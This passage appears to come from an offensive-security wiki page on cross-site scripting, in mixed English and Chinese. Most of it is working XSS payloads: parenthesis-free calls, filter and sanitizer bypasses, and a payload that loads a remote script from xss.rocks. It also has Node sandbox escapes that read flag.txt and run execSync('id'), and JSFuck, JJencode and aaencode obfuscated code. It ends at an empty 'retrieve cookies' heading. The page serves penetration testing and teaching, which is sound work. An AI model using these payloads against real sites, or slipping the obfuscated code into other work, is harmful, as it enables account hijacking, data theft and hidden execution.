Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意函数 (alert) 调用**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM 漏洞**

存在使用**不安全的由攻击者控制的数据**的**JS code**，例如 `location.href`。攻击者可以滥用这一点来执行任意 JS 代码。\
**由于关于 DOM vulnerabilities 的说明较长，已移至此页面** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**：**


{{#ref}}
dom-xss.md
{{#endref}}

在那里你会找到关于**什么是 DOM 漏洞、如何被触发以及如何利用它们**的详细解释。\
另外，别忘了**在所述文章的末尾**你可以找到关于 [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) 的解释。

### Upgrading Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

用户可能会与管理员共享其 profile，如果 self XSS 存在于该用户的 profile 中且管理员访问它，管理员就会触发该漏洞。

### Session Mirroring

If you find some self XSS and the web page have a **session mirroring for administrators**, for example allowing clients to ask for help an in order for the admin to help you he will be seeing what you are seeing in your session but from his session.

You could make the **administrator trigger your self XSS** and steal his cookies/session.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

查看专门的页面以获取利用工作流、DevTools 内存辅助工具和防御措施：

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

你可以检查**反射值**是否在服务器端（或客户端）被**unicode normalized**，并滥用此功能来绕过防护。 [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

由于 **RoR mass assignment**，引号会被插入到 HTML 中，这样就绕过了引号限制，额外的字段（onfocus）可以被添加到标签内部。\
表单示例 ([from this report](https://hackerone.com/reports/709336))，如果你发送 payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
这个键值对 "Key","Value" 将被回显如下：
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
然后，会插入 onfocus 属性，并发生 XSS。

### 特殊组合
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

如果你发现可以 **inject headers in a 302 Redirect response**，你可以尝试 **让浏览器执行任意 JavaScript**。这并非易事：现代浏览器在 HTTP 响应状态码为 302 时不会解析 HTTP 响应体，所以仅仅放置一个 cross-site scripting payload 是无效的。

在 [**this report**](https://www.gremwell.com/firefox-xss-302) 和 [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) 中，你可以看到如何在 Location header 中测试若干协议，并检查它们是否允许浏览器查看并执行位于响应体内的 XSS payload。\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

如果你能够指定将由 JavaScript 执行的 **callback**，且该 callback 仅包含这些字符（字母、数字和点），请[**阅读本文的该节**](#javascript-function)以了解如何滥用此行为。

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 如果你尝试使用例如 `application/octet-stream` 这样的 **content-type** 加载 script，Chrome 会抛出如下错误：

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

支持 Chrome 运行已加载 script 的唯一 **Content-Type** 是位于 const **`kSupportedJavascriptTypes`** 中的那些，来自 [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### 可用于 XSS 的 script 类型

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 那么，哪些类型可以用于加载脚本？
```html
<script type="???"></script>
```
- **module** (默认，无需说明)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles 是一个功能，允许你将一堆数据 (HTML, CSS, JS…) 打包到一个 **`.wbn`** 文件中。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** 允许改进 import 语法
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
这种行为在 [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) 中被用来将一个库重映射为 eval；滥用它可以触发 XSS。

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** 此功能主要用于解决由预渲染引起的一些问题。它的工作方式如下：
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### 导致 XSS 的 Web Content-Types

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 以下 Content-Types 可在所有浏览器中执行 XSS：

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? 不在列表中，但我记得在一次 CTF 中见过这个)
- application/rss+xml (off)
- application/atom+xml (off)

在其他浏览器中，其他 **`Content-Types`** 也可用来执行任意 JS，参见: https://github.com/BlackFan/content-type-research/blob/master/XSS.md

### xml 内容类型

如果页面返回 text/xml content-type，就可以指定一个命名空间并执行任意 JS：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊替换模式

当使用类似 **`"some {{template}} data".replace("{{template}}", <user_input>)`** 的代码时。攻击者可能会使用 [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement) 来尝试绕过某些防护： `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

例如在 [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) 中，这被用来在脚本内**转义一个 JSON 字符串**并执行任意代码。

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

如果你只能使用受限字符集，请查看这些针对 XSJail 问题的其他有效解决方案：
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
如果在执行不受信任的代码之前 **一切都是 undefined**（例如在 [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves) 中），就有可能从“无”生成有用的对象以滥用任意不受信任代码的执行：

- 使用 import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Accessing `require` indirectly

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) 模块会被 Node.js 包装在一个函数内，如下：
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
因此，如果我们能从该模块**调用另一个函数**，可以在该函数中使用 `arguments.callee.caller.arguments[1]` 来访问 **`require`**：
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
与前面的示例类似，可以通过 **use error handlers** 来访问模块的 **wrapper** 并获取 **`require`** 函数：
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### 混淆与高级绕过

- **同一页面的多种混淆：** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- 更复杂的 JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS 常见 payloads

### 多个 payloads 合并为 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

让用户在页面内导航而不退出 iframe 并窃取其操作（包括表单中提交的信息）：

{{#ref}}
../iframe-traps.md
{{#endref}}

### 检索 Cookies
```javascript
